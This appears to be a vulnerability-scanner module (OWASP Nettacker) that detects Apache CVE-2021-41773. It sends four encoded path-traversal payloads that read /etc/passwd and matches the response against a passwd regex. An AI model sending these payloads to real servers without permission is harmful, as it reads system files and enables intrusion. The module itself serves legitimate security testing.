info:
  name: apache_cve_2021_41773_vuln
  author: OWASP Nettacker Team
  severity: 8
  description: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root.
  reference:
    - https://therecord.media/apache-fixes-actively-exploited-web-server-zero-day/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
  profiles:
    - vuln
    - vulnerability
    - http
    - high_severity
    - cve2021
    - cve
    - apache
    - lfi

payloads:
  - library: http
    verify: false
    timeout: 3
    cert: ""
    stream: false
    proxies: ""
    steps:
      - method: get
        headers:
          User-Agent: "{user_agent}"
        allow_redirects: false
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/path"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              path:
                - "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
                - "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
                - "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
                - "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
        response:
          condition_type: and
          conditions:
            status_code:
              regex: '200'
              reverse: false
            content:
              regex: root:\\C+(:\\d+)+
              reverse: false
